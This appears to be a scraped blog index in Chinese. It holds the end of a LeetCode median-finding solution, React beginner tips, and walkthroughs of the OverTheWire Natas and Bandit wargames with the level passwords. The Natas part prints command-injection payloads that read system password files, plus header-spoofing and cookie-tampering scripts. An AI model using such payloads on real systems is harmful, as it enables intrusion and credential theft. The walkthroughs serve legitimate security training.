ps.1 为了简化，我假设 nums1[i-1], nums2[j-1], nums1[i], nums2[j] 总是合法的，即使出现 i=0, i=m, j=0, j=m 的情况。我将会在最后讨论边界情况。 ps.2 为什么需要 n&gt;=m ？因为我必须确保 j 为非负数，因为 0&lt;=i&lt;=m, j=(m+n+1)/2。如果 n &lt; m，j 会是负数，导致错误的结果。 在 [0,m]中搜索 i，找到满足以下条件的 i: ​ nums2[j-1] &lt;= nums1[i] and nums1[i-1] &lt;= nums2[j], where j = (m+n+1)/2 -i 具体的流程如下： 1.设置 imin = 0, imax = m, 开始在 [imin, imax] 中搜索。 2.设置 i = (imin+imax)/2, j = (m+n+1)/2 - i 3.现在满足条件 len(left_part) = len(right_part)。我们可能会遇到下列三种情况： nums2[j-1] &lt;= nums1[i] and nums1[i-1] &lt;= nums2[j] 表明我们已经找到了满足条件的 i ，停止搜索。 nums2[j-1] &gt; nums1[i] 表明nums1[i] 太小了。我们需要修改 i 来使 nums2[j-1] &lt;= nums1[i]。我们只能通过增加 i 来达到目的，因为减少 i 会使得 j 增大，导致 nums1[i] 更小。调整搜索范围到[i+1, imax]，即令 imin = i + 1，跳转到 2. nums1[i-1]&gt;nums2[j] 表明 nums1[i-1] 太大了。我们必须减少 i 来使 nums1[i-1] &lt;= nums2[j]。调整搜索范围到 [imin, i-1]，即令 imax = i - 1，跳转到2. 当满足条件的 i 被找到后，中值即为： max(nums1[i-1], nums2[j-1]), when m+n is odd max(nums1[i-1], nums2[j-1]+min(nums1[i], nums2[j]))/2, when m+n is even 现在我们可以考虑边界情况了：i=0, i=m, j=0, j=m。这种情况比你想象中的要好处理。 我们需要做的就是确保 max(left_part) &lt;= min(right_part)。所以，如果 i 和 j 不是边界值，我们必须同时检查nums2[j-1] &lt;= nums1[i] 和 nums1[i-1] &lt;= nums2[j]。但是如果 nums1[i-1], nums2[j-1], nums1[i], nums2[j] 中的一些值不存在，我们就不必检查这两种情况。例如，如果 i = 0， 那么 nums1[i-1] 不存在，我们就不需要检查 nums1[i-1] &lt;= nums2[j]。所以，我们需要做的是： 123searching i in [0,m], to find an object i such that:(j = 0 or i = m or nums2[j-1] &lt;= nums1[i]) and(i = 0 or j = n or nums1[i-1] &lt;= nums2[j], where j = (m+n+1)/2 -i) 所以我们只需要考虑以下三种情况： 12345671.(j=0 or i=m or nums2[j-1]&lt;=nums1[i]) and (i=0 or j=n or nums1[i-1]&lt;=nums2[j]) Means i is perfect, we can stop searching2.j&gt;0 and i&lt;m and nums2[j-1] &gt; nums1[i] Means i is too small, we must increase it3.i&gt;0 and j&lt;n and nums1[i-1] &gt; nums2[j] Means i is too big, we must decrease it Python代码如下： 123456789101112131415161718192021222324252627282930313233class Solution(object): def findMedianSortedArrays(self, nums1, nums2): \"\"\" :type nums1: List[int] :type nums2: List[int] :rtype: float \"\"\" m, n = len(nums1), len(nums2) if m &gt; n: m, n, nums1, nums2 = n, m, nums2, nums1 if n &lt; 0: raise ValueError imin, imax, half_len = 0, m, (m+n+1) / 2 while imin &lt;= imax: i = (imin+imax) / 2 j = half_len - i if i &gt; 0 and nums1[i-1] &gt; nums2[j]: imax = i - 1 elif i &lt; m and nums2[j-1] &gt; nums1[i]: imin = i + 1 else: if i == 0: max_left = nums2[j-1] elif j == 0: max_left = nums1[i-1] else: max_left = max(nums1[i-1], nums2[j-1]) if (m+n) % 2 == 1: return max_left if i == m: min_right = nums2[j] elif j == n: min_right = nums1[i] else: min_right = min(nums1[i], nums2[j]) return (min_right+max_left) / 2.0 复杂度分析 时间复杂度：O(log(min(m, n)))。 首先，搜索范围是 [0, m]。搜索的长度将会在每次循环后降低一半。所以我们仅仅需要 log(m) 次循环。因为我们在每次循环中做类似的操作，所以时间复杂度是 O(log(m))。而 m &lt;= n，所以时间复杂度是 O(log(min(m, n)))。 空间复杂度：O(1)。 我们仅仅需要常数级的内存来存储9个局部变量，所以空间复杂度是 O(1)。","link":"/2019/01/26/LeetCode题解——两个有序数组的中值/"},{"title":"React初学者，你需要知道这些","text":"一、React 技术栈所有的软件都构建在一系列的技术栈上，你需要足够理解构建你 app 的技术栈。React 的技术栈看起来很庞大的原因在于它总是被按照错误的顺序解释了。你应该按下列的顺序来学习，不要跳过或者同时学习它们： React 基础 npm JavaScript “bundlers”(webpack) ES6 Routing Flux 你不需要一次性学完它们。仅仅在遇到需要解决的问题时进行下一步的学习。额外地，有一些经常在 React 社区中被提及的前沿技术，它们非常有趣，但很难理解。和上面的主题比起来没有那么受欢迎并且在大部分 app 开发中也用不上。 Inline styles Server rendering Immutable.js Relay, Falcor, etc 二、React 只是一个视图库React 不是 MVC 框架，也不同于其他任何框架。它只是一个用来渲染你视图的库。如果你来自 MVC 的世界，你需要意识到 React 只是’V’，且是部分等于。你需要在其他地方找到你的 ‘M’ 和 ‘C’。不然你终将会在令人生厌的 React 代码前止步。 三、让组件尽可能的小这点是显而易见的，但也值得讨论。每一个优秀的开发者都知道小的类或模块更容易理解，测试和维护。对于 React 组件来说也是一样。在开始使用 React 时会有一个疑问，那就是我的组件到底该要多小？显然，确定的尺寸取决于很多因素（包括你和你的团队成员的偏好），但通常我的建议是让你的组件比你认为的还要小很多。比如下面这个用于展示我最近博客推送的组件： 12345678const LatestPostsComponent = props =&gt; ( &lt;section&gt; &lt;div&gt;&lt;h1&gt;Latest posts&lt;/h1&gt;&lt;/div&gt; &lt;div&gt; { props.posts.map(post =&gt; &lt;PostPreview key={post.slug} post={post}/&gt;) } &lt;/div&gt; &lt;/section&gt;); 这个组件本身是一个 &lt;section&gt;，仅有2个&lt;div&gt;在里面。第一个是标题，第二个映射了一些数据，为每一个元素渲染了 &lt;PostPreview&gt;。我认为这是一个组件适合的尺寸。 四、写函数组件之前有定义 React 组件有两种选择，第一种是 React.createClass():12345const MyComponent = React.createClass({ render: function() { return &lt;div className={this.props.className}/&gt;; }}); 另一种是 ES6 的类：12345class MyComponent extends React.Component { render() { return &lt;div className={this.props.className}/&gt;; }} React 0.14 引入了寻得定义组件的语法：123const MyComponent = props =&gt; ( &lt;div className={props.className}/&gt;); 这是至今我最喜欢的定义 React 组件的方法。除了更加简洁的语法，这种方法对组件需要被分离时很有帮助。让我们看一个例子，假设我们没有进行组件分离： 12345678910111213141516171819202122232425262728293031class LatestPostsComponent extends React.Component { render() { const postPreviews = renderPostPreviews(); return ( &lt;section&gt; &lt;div&gt;&lt;h1&gt;Latest posts&lt;/h1&gt;&lt;/div&gt; &lt;div&gt; { postPreviews } &lt;/div&gt; &lt;/section&gt; ); } renderPostPreviews() { return this.props.posts.map(post =&gt; this.renderPostPreview(post)); } renderPostPreview(post) { return ( &lt;article&gt; &lt;h3&gt;&lt;a href={`/post/${post.slug}`}&gt;{post.title}&lt;/a&gt;&lt;/h3&gt; &lt;time pubdate&gt;&lt;em&gt;{post.posted}&lt;/em&gt;&lt;/time&gt; &lt;div&gt; &lt;span&gt;{post.blurb}&lt;/span&gt; &lt;a href={`/post/${post.slug}`}&gt;Read more...&lt;/a&gt; &lt;/div&gt; &lt;/article&gt; ); }} 这种写法并不是很糟糕。我们已经从 render() 方法中抽取了大量方法，并保证每一块代码都尽可能小并很好地命名。我们已经将 renderPostPreviews()方法封装地足够好了。让我们使用函数语法重写这段代码： 123456789101112131415161718192021222324252627const LatestPostsComponent = props =&gt; { const postPreviews = renderPostPreviews(props.posts); return ( &lt;section&gt; &lt;div&gt;&lt;h1&gt;Latest posts&lt;/h1&gt;&lt;/div&gt; &lt;div&gt; { postPreviews } &lt;/div&gt; &lt;/section&gt; );};const renderPostPreviews = posts =&gt; ( posts.map(post =&gt; this.renderPostPreview(post)));const renderPostPreview = post =&gt; ( &lt;article&gt; &lt;h3&gt;&lt;a href={`/post/${post.slug}`}&gt;{post.title}&lt;/a&gt;&lt;/h3&gt; &lt;time pubdate&gt;&lt;em&gt;{post.posted}&lt;/em&gt;&lt;/time&gt; &lt;div&gt; &lt;span&gt;{post.blurb}&lt;/span&gt; &lt;a href={`/post/${post.slug}`}&gt;Read more...&lt;/a&gt; &lt;/div&gt; &lt;/article&gt;); 两段段代码几乎一致，只是后面的没有了类的声明。然而对我来说这是很大的区别。在基于类的例子中，我会看到 class LatestPostsComponent { ，并自然地向下扫直到大花括号，也就是类定义结束的地方，也是组件定义结束的地方。而当我看函数组件时，，我看到const LatestPostsComponent = props =&gt; { ，仅仅扫到函数定义结束的地方。“函数定义在这里结束了，所以组件定义也结束了”。我这样想着，“但是等等，其他在组件外且在同一模块下的代码呢？哦！！这是其它用于获取数据和渲染视图的函数，我可以将它们全部提取到一个组件中。”这是一种让人非常舒服的，让人遵守“让组件尽可能小”的方式。在未来会有对 React 的进一步优化，这会让函数组件比基于类的组件更加高效。值得注意的是函数组件有一些’限制’，我认为这让它变得更强大。第一点是函数组件无法赋予 ref 属性。ref是组件查询子节点并与之通讯的便捷的方式，而我却觉得这是写 React 代码的一种错误方式。ref鼓励一种非常命令式地，类似于 jquery 的方式来写组件，把我们带离了最初选择 React 的函数式的，单向数据流的哲学。另一点是函数组件没有与之相关联的 state，这也是一个非常大的优点。 五、写无状态组件可以这么说，至今为止我写 React 代码的几乎所有痛苦都来自于组件有太多的状态。状态让组件很难测试实践表明，没有什么比测试纯粹的、data-in data-out 函数更容易的了，所以我们不要为组件定义那么多状态。当测试有状态的组件时，我们需要让组件进入“合适”的状态以测试它们的行为。我们同样需要考虑所有状态（组件可以在任何时候被修改）和属性（组件无法控制）的组合，并决定测试哪一个。当组件只是输入属性的函数时，测试会变得简单许多。状态使得在组件中添加业务代码变得很容易让组件来决定程序的行为是我们在任何情况下都不应该考虑的。记住，React 只是一个视图库，在组件中写渲染逻辑是没问题的，但不能写业务逻辑（业务逻辑意味着大量代码）。但是当你的组件中有大量应用程序的状态并且可以轻易地通过 this.state访问时，你就会不自觉地将计算或者验证类的代码写入组件。这会让测试的工作变得非常困难。状态使得在 app 的其他部分共享信息变得困难当一个组件有一些状态时，它很容易在组件间传递状态，但向其它方向传递会变得很棘手。 六、使用 Redux.jsReact 是一个视图库，那么问题来了：“我在哪里放我的状态和逻辑呢？”没错， Redux.js 可以替你做这些。下面是 React 的工作流程：1.组件被给予了用做回调函数的属性，在 UI 事件触发时调用。2.这些回调函数根据事件来创建并分发动作(action)。3.reducer执行动作，并计算新的状态。4.整个应用得新的状态将会保存在 single store。5.组件接受新的状态并在它们必要时重新渲染。Redux 的几点好处： reducer 是纯函数，简单地执行 oldState + action = newState。每一个 reducer 计算一部分状态并将它们组合到一起生成整个应用。这使得你的业务逻辑和状态变换很容易测试。 API 很小，很简单并且很好文档化。我可以迅速地进行查找并很容易学习全部的原理，之后就能更容易理解我的工程的动作和信息流。 如果你按推荐的方式使用它，仅仅只有很少的一部分组件需要依赖 Redux。其他组件只需要接受属性。这使得组件很简单。还有一些用于补充 Redux 的库如下： Immutable.js - 用于 JavaScript 的不可变数据结构。将你的状态保存在这里，使得状态在它不应该被改变的时候不改变，并确保 reducer 的纯净。 redux-thunk - 用于你的动作不改变状态的时候。例如：调用一个 REST API 或者设置路由，或者分发其他动作。 七、总是使用 propTypespropTypes 为我们提供了一种非常容易的方式来为组件更安全地添加类型。1234567891011121314const ListOfNumbers = props =&gt; ( &lt;ol className={props.className}&gt; { props.numbers.map(number =&gt; ( &lt;li&gt;{number}&lt;/li&gt;) ) } &lt;/ol&gt;);ListOfNumbers.propTypes = { className: React.PropTypes.string.isRequired, numbers: React.PropTypes.arrayOf(React.PropTypes.number)}; 它有一下几点好处： 更容易捕获 bugs，以避免愚蠢的错误。 如果你使用 isRequired，你就不必总是检查 undefined 和null。 它类似于文档，其他开发者就不必看完整个组件来看属性是否必须了。 八、使用 React 和 Redux dev toolsReact 和 Redux dev tools 都是非常棒的工具。React dev tool 是你能够查阅已经渲染的 React 元素树，这对于查看浏览器中的视图很有帮助。Redux dev tool 更加出色，使你能查看发生的每一个动作，以及动作造成的状态改变，甚至给你能够回溯的能力。你也可以设置热模块来替代 webpack,使你的页面在你的代码改变时就更新-不需要浏览器主动刷新。这使得反馈循环更加地高效。","link":"/2019/02/19/React初学者，你需要知道这些/"},{"title":"wargame--Natas","text":"#Natas Natas是wargame 系列挑战中的第二个系列，是关于 Web 安全的一个专题，通过这个专题基本可以了解到 web 安全中主要的问题，非常适合初学者入门 Web 安全。所有的挑战都可以通过浏览器网页登入，需要在当前关卡中获得进入下一关的密码来继续挑战，和 Bandit 的形式类似。 Level 0&rarr;1在网页处右键“查看源代码”将会展示源代码。底部的注释中有到 “natas1” 的密码。 12&gt;gtVrDuiDfck831PqWsLEZy5gyDz1clto&gt; Level 1&rarr;2和上一关一样，右键查看源码即可得到下一关的密码。 12&gt;ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi&gt; Level 2&rarr;3查看源码将会显示一个有 png 文件的文件夹。前往文件夹我们就能发现另一个文件 users.txt 。在 users.txt 里包含下一关的密码。 12&gt;sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14&gt; Level 3&rarr;4robots.txt 是一个告诉 google 不要索引哪些文件夹的文件。 在 robots.txt 中，它会不允许索引 /s3cr3t/ 。进入该目录，发现 user.txt 里包含下一关的密码。 12&gt;Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ&gt; Level 4&rarr;5错误信息表明任何访问该页面的用户必须来自’natas5’。所以我们可以修改 headers，伪造一份来自 ‘natas5’ 的请求。 1234567891011121314import requestsimport reusername = 'natas4'password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'headers = { \"Referer\" : \"http://natas5.natas.labs.overthewire.org/\"}url = 'http://%s.natas.labs.overthewire.org/' % usernameresponse = requests.get(url, auth=(username, password), headers=headers)content = response.textprint content 12&gt;iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq&gt; Level 5&rarr;6通过 chrome 自带的调试工具或者直接用 python 脚本可以查看网站返回的包。发现其中的 cookie 有一个变量 ‘loggedin’ 值为0.我们将其设为1后再次请求就可以得到下一关的密码。 12345678910111213141516import requestsimport reusername = 'natas5'password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'cookies = {\"loggedin\" : \"1\" }url = 'http://%s.natas.labs.overthewire.org/' % usernamesession = requests.Session()response = session.get(url, auth=(username, password), cookies=cookies)contentprint contentprint re.findall('natas6 is (.*)&lt;/div&gt;', content)[0] 12&gt;aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1&gt; Level 6&rarr;7查看页面的源码，发现需要提交正确的秘钥才能获得下一关的密码，而一个文件被包含在 /includes/secret.inc 中。打开这个文件找到正确的秘钥并提交表单即可获得下一关的密码。 1234567891011121314151617import requestsimport reusername = 'natas6'password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'url = 'http://%s.natas.labs.overthewire.org' % usernamesession = requests.Session()response = session.post(url, auth=(username, password), data={\"secret\" : \"FOEIUWGHFEEUHOFUOIU\", \"submit\" : \"submit\"})content = response.textprint contentprint re.findall('natas7 is (.*)', content)[0] ​ 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9》 Level 7&rarr;8查看页面源码时，发现一条线索说密码在 /etc/natas_webpass/natas8 中。改变浏览器的路径为 /etc/natas_webpass/natas8 即可得到下一关的密码。 12&gt;DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe&gt; Level 8&rarr;9在源码页面，我们可以看到 php 函数代码给了我们一些需要输入的秘钥的信息。从 \\$_POST(‘secret’)中我们可以看到需要传入的与 \\$encodedSecret 比较的字符串。 123456789101112131415&lt;?$encodedSecret = \"3d3d516343746d4d6d6c315669563362\";function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret)));}if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is &lt;censored&gt;\"; } else { print \"Wrong secret\"; }}?&gt; 之后我们就可以逆向调用在 encodeSecret 中使用的函数，通过创建和运行下列命令，我们就获得了纯文本的秘钥。 1base64_decode(strrev(hex2bin(&quot;3d3d516343746d4d6d6c3156 69563362&quot;))) 解码得到的结果为 oubWYf2kBq。使用该秘钥提交表单即可得到下一关的密码。 12&gt;W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl&gt; Level 9&rarr;10查看网页源码，我们可以发现将要查询的是 \\$key。如果 \\$key 非空，将在 dictionary.txt 中查询并返回任何包含 \\$key 的内容。 1234567891011&lt;?$key = \"\";if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"];}if($key != \"\") { passthru(\"grep -i $key dictionary.txt\");}?&gt; 在注入中，\\$key 没有被过滤并能在命令行中使用。因此我们可以注入额外的命令。我们已知的是 ‘natas10’ 的密码保存在 /etc/natas_webpass/natas10 中。在命令行中，我们可以用cat 来查看文件内容。另一件需要知道的是在一行中执行多条命令（; 或 &amp;&amp;）。最后不要忘了注释掉后面的命令。 1; cat /etc/natas_webpass/natas10 # 执行后，就可以得到下一关的密码。 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu Level 10&rarr;11和上一关类似，不过我们不能使用’;’,’|’和’&amp;’。但仍能利用类似的注入攻击。我们可以使用 grep 匹配密码文件中的任意字符来获得下一关的密码。为了能匹配任意字符，我们使用’.’通配符并用 ‘#’注释掉后面的内容。 1. /etc/natas_webpass/natas11 # 得到下一关的密码。 1U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK ### ###","link":"/2019/01/20/wargame-Natas/"},{"title":"wargame--Bandit","text":"Bandit 是wargame 系列挑战中的第一个系列，也是最基础的一个，可以用来巩固一些命令行基础知识，所有的挑战都通过终端直接 ssh 连接远程主机即可。我在两周前打完了 Bandit,所以写下这篇博客来做一个总结。 Level 0目标使用 ssh 连接到目标主机 bandit.labs.overthewire.org 。用户名为bandit0，密码为bandit0。 可能会用到的命令ssh 非常简单，直接连进去可以得到下一关的密码。 1sshpass -p `natas0` ssh natas0@bandit.labs.overthewire.org -p 2220 这里用到了 sshpass 命令，这个命令允许你进行 ssh 连接时直接输入密码，而不需要再标准输入中输入，非常方便，之后的连接我都是使用的这个命令。可以通过该页面 查看安装如何安装 Level 0 &rarr; 1目标下一关的密码保存在用户目录下的 readme文件中。无论什么时候得到了下一关的密码，使用 ssh 登入下一关并继续挑战。 可能会用到的命令ls, cd, cat, file, du, find 使用ls 查看用户目录并用cat查看文件内容。 12cat readmeboJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level 1&rarr; 2目标下一关的密码保存在用户目录下的”-“文件中。 可能会用到的命令ls, cd, cat, file, du, find 使用 ls 查看目录并使用 cat 查看文件内容。然而在使用 cat 命令时会出现一直空等的情况。因为文件名”-“是一个特殊字符，它会告诉 Shell 用户想从标准输入输入数据，所以 Shell 就会空等。解决办法就是带上文件路径。 123cat ~/-cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level 2&rarr;3目标下一关的密码保存在用户目录下的 space in this filename文件中。 可能会用到的命令ls, cd, cat, file, du, find 这一关考察的是转义符的应用。如果直接在 Shell 中打出文件命令的话，Shell 会将输入理解为多个参数，而不是一个文件名，因此需要用转义符’\\‘来对空格进行转义。 123cat \"spaces in this filename\"cat spaces\\ in\\ this\\ filenameUmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level 3&rarr;4目标下一关的密码保存在 inhere 文件夹下的隐藏文件中。 可能会用到的命令ls, cd, cat, file, du, find 主要熟悉 ls 命令，加上 -a 参数后就可以看到当前文件夹下包括隐藏文件在内的所有文件。 1234cd inherels -acat .hiddenpIwrPrtPN36QITSp3EQaw936yaFoFgAB Level 4&rarr; 5目标下一关的密码保存在 inhere 文件夹下唯一可读的文件中。 可能会用到的命令ls, cd, cat, file, du, find 在 inhere 有很多文件，但只有一个是可读的。使用 file 命令可以查看所有文件的文件类型，发现只有一个文件是 ASCII 格式的，那就是我们需要的！ 1234cd inherefile ./-*cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKh level 5&rarr;6目标下一关的密码保存在 inhere 文件夹的某个文件中，它有下列特征：可读的；1033字节；不可执行。 可能会用到的命令ls, cd, cat, file, du, find 这一关用到 find 命令。参数 -size 可以用来指定文件的大小，在数字后加 ‘c’用字节表示，加’k’用 kb 表示，加’M’用 MB 表示。参数 -type 用来指定文件的类型，’f’表示普通文件，’I’表示链接文件，’d’表示目录。 12345cd inherefind ./ -type f -size 1033cfind ./ -size 1033ccat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level 6&rarr;7目标和上一关类似，这一关的文件在服务器中，没有告诉我们具体位置。这一关的文件有以下特征：属于用户 bandit7；属于组 bandit6；33字节。 可能会用到的命令ls, cd, cat, file, du, find, grep 这一关还是要用到 find命令。我们已经知道了使用 -size 33c来寻找长33字节的文件。参数 -group bandit6 将会寻找属于组 bandit6 的文件。参数 -user bandit7 将会寻找属于用户 bandit7 的文件。因为该文件在服务器的某处，所以我们要从根目录开始找。执行命令后将会产生许多拒绝访问的报错信息。为了过滤掉这些没用的信息，我们使用 （2&gt;/dev/null）。 小贴士： ‘&gt;’操作符重定向输出到文件或设备。也可以使用’&gt;&gt;’来附加（’&gt;’会覆盖源文件，如果有的话）。 > file : 重定向标准输出到文件 1&gt;file : 重定向标准输出到文件 2&gt;file : 重定向标准错误到文件 &amp;&gt;file : 重定向标准输出和错误到文件 /dev/null 是空设备，任何定向到它的数据都会被删除，可以用来压缩任何输出。 123find / -size 33c -user bandit7 -group bandit6 2&gt;/dev/nullcat /var/lib/dpkg/info/bandit7.passwordHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level 7&rarr;8目标下一关的密码保存在 data.txt 文件中的单词 millionth 后面。 可能会用到的命令grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd 这一关很简单，直接用 grep 就好。 12grep \"millionth\" data.txtmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level 8&rarr;9目标下一关的密码保存在文件 data.txt中并且仅有一行只出现一次。 可能会用到的命令grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd 因为下一关的密码是唯一的一行，我们需要使用uniq -u命令来从 data.txt中获取。然而，uniq 只能从输入中过滤相邻匹配的行，所以我们需要在使用uniq前排序。因此，我们需要sort data.txt 并使用管道传递给uniq -u。 12sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level 9&rarr;10###目标 下一关的密码保存在 data.txt 文件中，只有少部分以’=’ 开头的字符串是可读的。 可能用到的命令grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd 使用 strings命令打印出文件中所有可打印的字符，然后用管道将其传递给 grep = 来查找所有的’=’。 输出的所有行将会包含’=’，其中之一会有密码。如果使用’==’来替代’=’，你会发现仅有4行结果。 12345strings data.txt | grep ============ the,========== passwordc========== is========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level 10&rarr;11###目标 下一关的密码保存在 data.txt文件中，它包含 base64 编码的数据。 可能用到的命令grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd 提示在于 base64 编码的数据。我们需要将 base64 编码的数据解码来获取下一关的密码。 12base64 -d data.txtThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level 11&rarr;12目标下一关的密码保存在 data.txt 中，所有的小写（a-z）和大写（A-Z）字母都经过了13位翻转。 可能用到的命令grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd 从命令列表中发现，tr 命令用于变换或删除字符。使用方式：tr [OPTION] … SET1 [SET2]。SETs可以被表示为 CHAR1-CHAR2，其中所有的字符是以升序从 CHAR1 到 CHAR2。ROT13是翻转 a 到 n，b 到 o, c 到 p … z 到 m，大写字母类似。我们可以写出完整的列表或者简化版本。首先，我们需要通过管道将 data.txt 作为输入传给 tr。 123cat data.txt | tr abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLMcat data.txt | tr a-zA-Z n-za-mN-ZA-MThe password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level 12&rarr;13###目标 下一关的密码保存在文件 data.txt 中，它是一个被重复压缩的 hexdump 文件。在这一关中，使用 mkdir 命令在 /tmp 目录下创建一个可以工作的目录是非常有用的。例如：mkdir /tmp/myname123。之后用 cp 复制 data.txt 文件并用 mv重命名。 可能用到的命令grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd, mkdir, cp, mv 从列出的命令来看，xxd 用来生成 hexdump 或者进行逆向。应该是会用到的。另外，这个文件被重复压缩了，所以我们也会需要gzip 和bzip2。就像目标中提及的，这需要进行几次迭代和一个临时的工作目录。 首先，我们将 hexdump文件逆向成二进制文件。使用 file 命令，我们可以查看文件的压缩格式。使用man gzip命令，我们可以查到解压的参数是-d 。如果我们现在使用gzip -d data2，这将会报未知后缀的错误。因此，我们需要在解压前重命名文件为.gz 后缀 12345xxd -r data.txt data2file data2data2: gzip compressed data, was \"data2.bin\", from Unix, last modified: Thu Jun 6 13:59:44 2013, max compressionmv data2 data.gzgzip -d data.gz 现在一个新的文件 data 已经在目录中了。再次使用 file 来查看文件的类型。data 是一个 bzip2 压缩文件。使用 bzip2 -d data 来解压。它会抱怨源文件名并添加一个 .out 后缀。 1234file datadata: bzip2 compressed data, block size = 900kbzip2 -d databzip2: Can't guess original name for data -- using data.out 重复类似的操作，可以得到下一关的密码。 12345678910111213141516171819202122232425file data.outdata.out: gzip compressed data, was \"data4.bin\", from Unix, last modified: Thu Jun 6 13:59:43 2013, max compressionzcat data.out &gt; data3file data3data3: POSIX tar archive (GNU)tar -xvf data3data5.binfile data5.bindata5.bin: POSIX tar archive (GNU)tar -xvf data5.bindata6.binfile data6.binbzip2 -d data6.binbzip2: Can't guess original name for data6.bin -- using data6.bin.outfile data6.bin.outdata6.bin.out: POSIX tar archive (GNU)tar -xvf data6.bin.outdata8.binfile data8.bindata8.bin: gzip compressed data, was \"data9.bin\", from Unix, last modified: Thu Jun 6 13:59:43 2013, max compressionzcat data8.bin &gt; data9.binfile data9.bindata9.bin: ASCII textcat data9.bin8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level 13&rarr;14目标下一关的密码保存在 /etc/bandit_pass/bandit14 中，并且只能被用户 bandit14 读。在这一关中，你无法获得下一关的密码，但是你可以获得用于登录下一关的 SSH 私钥。注意：localhost 是你正在工作的机器的主机名。 可能用到的命令ssh, telnet, nc, openssl, s_client, nmap 线索来自目标。首先一个 SSH 私钥已经在 bandit13 的用户目录下了。 1sshkey.private 我们必须以 bandit14 的身份使用私钥进行登录。 1ssh -i sshkey.private bandit14@localhost 在我们以 bandit14 的身份登录后，我们需要做的就是拿到下一关的密码。 12cat /etc/bandit_pass/bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level 14&rarr;15目标可以通过提交本关的密码到 localhost 上的 30000 端口来获取下一关的密码。 可能用到的命令ssh, telnet, nc, openssl, s_client, nmap 123nc localhost 30000 &lt; /etc/bandit_pass/bandit14Correct!BfMYroe26WYalil77FoDi9qh59eK5xNr Level 15&rarr;16###目标 可以使用 SSL 加密提交本关的密码到 Localhost 上的端口 30001来获取下一关的密码。 可能用到的命令ssh, telnet, nc, openssl, s_client, nmap 在 openssl 的帮助页面上，s_client 命令实现了一个通用的 SSL/TLS客户端。用它来完成本关的挑战。 123openssl s_client -connect localhost:30001 -quiet &lt; /etc/bandit_pass/bandit15Correct!cluFn7wTiGryunymYOu4RcffSxQluehd Level 16&rarr;17目标提交当前关的密码到 localhost 上范围31000-32000的一个端口上来获取下一关的密码。首先找到哪些端口正被服务器监听。之后找到哪些支持SSL，哪些不支持。仅有一个端口会返回下一关的密码，其它的则是返回你发送的数据。 可能用到的命令ssh, telnet, nc, openssl, s_client, nmap 查看一下提供的命令，nmap 看起来是我们需要的。参数 -p 可用来指定扫描端口的范围。 1234567891011121314nmap -p 31000-32000 localhostStarting Nmap 5.21 ( http://nmap.org ) at 2014-11-02 07:06 UTCNmap scan report for localhost (127.0.0.1)Host is up (0.00087s latency).Not shown: 996 closed portsPORT STATE SERVICE31046/tcp open unknown31518/tcp open unknown31691/tcp open unknown31790/tcp open unknown31960/tcp open unknownNmap done: 1 IP address (1 host up) scanned in 0.08 seconds 有5个在扫描范围内开放的端口。我们可以检查每一个端口，发现 31790 是我们想要的。另外，我们可以写一个脚本，创建一个 /tmp/key 文件夹并将密钥保存在这。 1cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:31790 -quiet &gt; /tmp/key/b16pkey 如果你这样使用密钥，是非常不安全的，因为每个人都可以看到它。原因在于该文件的读写权限对所有人都是开放的。我们需要改变它的读写权限让它仅对拥有者开放。 1chmod 600 /tmp/key/b16pkey 之后我们就可以用它登录了。 1ssh -i /tmp/key/b16pkey bandit17@localhost 下一关的密码在同样的位置。 12cat /etc/bandit_pass/bandit17xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn Level 17&rarr;18目标用户目录下有两个文件：passwords.old 和 passwords.new 。下一关的密码在 password.new 中，并且在新密码和旧密码中仅有一行不同。 可能用到的命令cat, grep, ls diff 命令会输出两个文件中所有不同的行。 12345diff passwords.new passwords.old42c42&lt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd---&gt; PRjrhDcANrVM6em57fPnFp4Tcq8gvwzK Level 18&rarr;19###目标 下一关的密码保存在用户目录下的 readme 文件夹下。不幸的是，在你使用 SSH 登录的时候，某个人已经修改了 .bashrc 文件来将你登出。 可能用到的命令ssh, ls, cat 从 ssh 的帮助文档中，我们可以在登录之后执行一个命令。因为我们已经知道密码保存在哪，我们可以在被登出前查看它。 12ssh bandit18@bandit.labs.overthewire.org cat 